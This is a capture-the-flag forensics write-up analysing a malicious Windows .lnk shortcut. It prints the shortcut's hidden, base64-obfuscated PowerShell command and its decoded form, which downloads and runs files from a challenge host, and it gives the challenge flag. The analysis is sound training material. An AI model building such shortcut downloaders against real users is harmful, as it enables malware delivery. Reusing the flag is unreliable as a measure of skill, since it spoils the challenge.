# ShortcutHaunting

## FLAG: HTB{tr1ck_0r_tr34t_g03s_wr0ng}

## Status: Complete

+ DOCKER: No
+ DOWNLOADABLE: Yes

Description: While going through your Halloween treats, a strange message appears: Trick or Treat? Curious, you click, and suddenly a mysterious .lnk file appears on your desktop. Now it's up to you to investigate this spooky shortcut and find out if it’s just a trick—or if it’s hiding a darker secret.

## NOTES

1. Unzip challenge files
   1. > unzip forensics_the_shortcut_haunting.zip
      1. trick_or_treat.lnk
2. MANUAL ENUMERATION
   1. FILE
      1. > file trick_or_treat.lnk
         1. trick_or_treat.lnk: MS Windows shortcut, Item id list present, Has Description string, Has Relative path, Has command line arguments, Icon number=70, Unicoded, HasExpIcon "%SystemRoot%\System32\shell32.dll", length=0, window=showminnoactive, hot key C+CONTROL, IDListSize 0x020d, Root folder "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\"
         2. This looks like a windows shortcut
   2. STRINGS
      1. > strings trick_or_treat.lnk

        ```text
            /C:\
            Windows
            System32
            WindowsPowerShell
            v1.0
            powershell.exe
            %SystemRoot%\System32\shell32.dll
            1SPS
        ```

3. RESEARCH
   1. So we need to be able to extract metadata from the windows .lnk file (from a kali-linux system)
   2. Looking around I found a tool lnkinfo from the liblnk-utils package in Debian, so lets install this
      1. > sudo apt install lnkinfo -Y
4. INVESTIGATION
   1. Now we have the tool lets run it on our .lnk file
      1. > lnkinfo trick_or_treat.lnk

            ```text
                lnkinfo 20181227

                Windows Shortcut information:
                        Contains a link target identifier
                        Contains a description string
                        Contains a relative path string
                        Contains a command line arguments string
                        Contains an icon location string
                        Contains an icon location block

                Link information:
                        Creation time                   : Not set (0)
                        Modification time               : Not set (0)
                        Access time                     : Not set (0)
                        File size                       : 0 bytes
                        Icon index                      : 70
                        Show Window value               : 0x00000000
                        Hot Key value                   : 0
                        File attribute flags            : 0x00000000
                        Description                     : Trick or treat
                        Relative path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                        Command line arguments          : -WindowStyle hidden -NoExit -Command "$fko = 'aXdyIC1VcmkgaHR0cHM6Ly90cmlja29ydHJlYXQuaHRiL2Jvby5wZGYgLU91dEZpbGUgJGVudjpURU1QXCBEcm9wYm94IGJvby5wZGY7JGZsYWc9J0hUQnt0cjFja18wcl90cjM0dF9nMDNzX3dyMG5nfSc7U3RhcnQtUHJvY2VzcyAkZW52OlRFTVBcIERyb3Bib3ggYm9vLnBkZjtTdGFydC1TbGVlcCAtcyA1O2l3ciAtVXJpIGh0dHBzOi8vdHJpY2tvcnRyZWF0Lmh0Yi9jYW5keS5qcyAtT3V0RmlsZSAkZW52OlRFTVBcY2FjbmR5LmpzO1N0YXJ0LVByb2Nlc3MgJGVudjpURU1QXGNhbmR5LmpzO0V4aXQ=';$dwQWf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fko));Invoke-Expression -Command $dwQWf"9%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
                        Icon location                   : %SystemRoot%\System32\shell32.dll

                Link target identifier:
                        Shell item list
                                Number of items         : 7

                        Shell item: 1
                                Item type               : Root folder
                                Class type indicator    : 0x1f (Root folder)
                                Shell folder identifier : 20d04fe0-3aea-1069-a2d8-08002b30309d
                                Shell folder name       : My Computer

                        Shell item: 2
                                Item type               : Volume
                                Class type indicator    : 0x2f (Volume)
                                Volume name             : C:\

                        Shell item: 3
                                Item type               : File entry
                                Class type indicator    : 0x31 (File entry: Directory)
                                Name                    : Windows
                                Modification time       : Not set (0)
                                File attribute flags    : 0x00000010
                                        Is directory (FILE_ATTRIBUTE_DIRECTORY)
                        Extension block: 1
                                Signature               : 0xbeef0004 (File entry extension)
                                Long name               : Windows
                                Creation time           : Not set (0)
                                Access time             : Not set (0)

                        Shell item: 4
                                Item type               : File entry
                                Class type indicator    : 0x31 (File entry: Directory)
                                Name                    : System32
                                Modification time       : Not set (0)
                                File attribute flags    : 0x00000010
                                        Is directory (FILE_ATTRIBUTE_DIRECTORY)
                        Extension block: 1
                                Signature               : 0xbeef0004 (File entry extension)
                                Long name               : System32
                                Creation time           : Not set (0)
                                Access time             : Not set (0)

                        Shell item: 5
                                Item type               : File entry
                                Class type indicator    : 0x31 (File entry: Directory)
                                Name                    : WindowsPowerShell
                                Modification time       : Not set (0)
                                File attribute flags    : 0x00000010
                                        Is directory (FILE_ATTRIBUTE_DIRECTORY)
                        Extension block: 1
                                Signature               : 0xbeef0004 (File entry extension)
                                Long name               : WindowsPowerShell
                                Creation time           : Not set (0)
                                Access time             : Not set (0)

                        Shell item: 6
                                Item type               : File entry
                                Class type indicator    : 0x31 (File entry: Directory)
                                Name                    : v1.0
                                Modification time       : Not set (0)
                                File attribute flags    : 0x00000010
                                        Is directory (FILE_ATTRIBUTE_DIRECTORY)
                        Extension block: 1
                                Signature               : 0xbeef0004 (File entry extension)
                                Long name               : v1.0
                                Creation time           : Not set (0)
                                Access time             : Not set (0)

                        Shell item: 7
                                Item type               : File entry
                                Class type indicator    : 0x32 (File entry: File)
                                Name                    : powershell.exe
                                Modification time       : Not set (0)
                                File attribute flags    : 0x00000000
                        Extension block: 1
                                Signature               : 0xbeef0004 (File entry extension)
                                Long name               : powershell.exe
                                Creation time           : Not set (0)
                                Access time             : Not set (0)
            ```

            1. SUCCESS!!!
            2. Now looking through it looks like we have something that invokes powershell, and then passes through some arguments
5. DEOBFUSCATE
   1. Here is the powershell command it runs

        ```ps1
            Command line arguments          : -WindowStyle hidden -NoExit -Command "$fko = 'aXdyIC1VcmkgaHR0cHM6Ly90cmlja29ydHJlYXQuaHRiL2Jvby5wZGYgLU91dEZpbGUgJGVudjpURU1QXCBEcm9wYm94IGJvby5wZGY7JGZsYWc9J0hUQnt0cjFja18wcl90cjM0dF9nMDNzX3dyMG5nfSc7U3RhcnQtUHJvY2VzcyAkZW52OlRFTVBcIERyb3Bib3ggYm9vLnBkZjtTdGFydC1TbGVlcCAtcyA1O2l3ciAtVXJpIGh0dHBzOi8vdHJpY2tvcnRyZWF0Lmh0Yi9jYW5keS5qcyAtT3V0RmlsZSAkZW52OlRFTVBcY2FjbmR5LmpzO1N0YXJ0LVByb2Nlc3MgJGVudjpURU1QXGNhbmR5LmpzO0V4aXQ=';$dwQWf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fko));Invoke-Expression -Command $dwQWf"9%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
        ```

        1. Now lets break this down
        2. WindowStyle is hidden (which tries to hide / mask this)
        3. Set variable $fko = 'aXdyIC1VcmkgaHR0cHM6Ly90cmlja29ydHJlYXQuaHRiL2Jvby5wZGYgLU91dEZpbGUgJGVudjpURU1QXCBEcm9wYm94IGJvby5wZGY7JGZsYWc9J0hUQnt0cjFja18wcl90cjM0dF9nMDNzX3dyMG5nfSc7U3RhcnQtUHJvY2VzcyAkZW52OlRFTVBcIERyb3Bib3ggYm9vLnBkZjtTdGFydC1TbGVlcCAtcyA1O2l3ciAtVXJpIGh0dHBzOi8vdHJpY2tvcnRyZWF0Lmh0Yi9jYW5keS5qcyAtT3V0RmlsZSAkZW52OlRFTVBcY2FjbmR5LmpzO1N0YXJ0LVByb2Nlc3MgJGVudjpURU1QXGNhbmR5LmpzO0V4aXQ='
        4. Set variable $dwQWf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fko));
           1. This looks like it is just decoding that large string from base64
        5. Then invoke the expression
   2. DECODE
      1. Lets decode that base64 string
         1. > echo "aXdyIC1VcmkgaHR0cHM6Ly90cmlja29ydHJlYXQuaHRiL2Jvby5wZGYgLU91dEZpbGUgJGVudjpURU1QXCBEcm9wYm94IGJvby5wZGY7JGZsYWc9J0hUQnt0cjFja18wcl90cjM0dF9nMDNzX3dyMG5nfSc7U3RhcnQtUHJvY2VzcyAkZW52OlRFTVBcIERyb3Bib3ggYm9vLnBkZjtTdGFydC1TbGVlcCAtcyA1O2l3ciAtVXJpIGh0dHBzOi8vdHJpY2tvcnRyZWF0Lmh0Yi9jYW5keS5qcyAtT3V0RmlsZSAkZW52OlRFTVBcY2FjbmR5LmpzO1N0YXJ0LVByb2Nlc3MgJGVudjpURU1QXGNhbmR5LmpzO0V4aXQ=" | base64 -d
            1. RESPONSE: "iwr -Uri https://trickortreat.htb/boo.pdf -OutFile $env:TEMP\ Dropbox boo.pdf;$flag='HTB{tr1ck_0r_tr34t_g03s_wr0ng}';Start-Process $env:TEMP\ Dropbox boo.pdf;Start-Sleep -s 5;iwr -Uri https://trickortreat.htb/candy.js -OutFile $env:TEMP\cacndy.js;Start-Process $env:TEMP\candy.js;Exit"
   3. SUCCESS!! We see the flag embedded:
      1. $flag='HTB{tr1ck_0r_tr34t_g03s_wr0ng}'
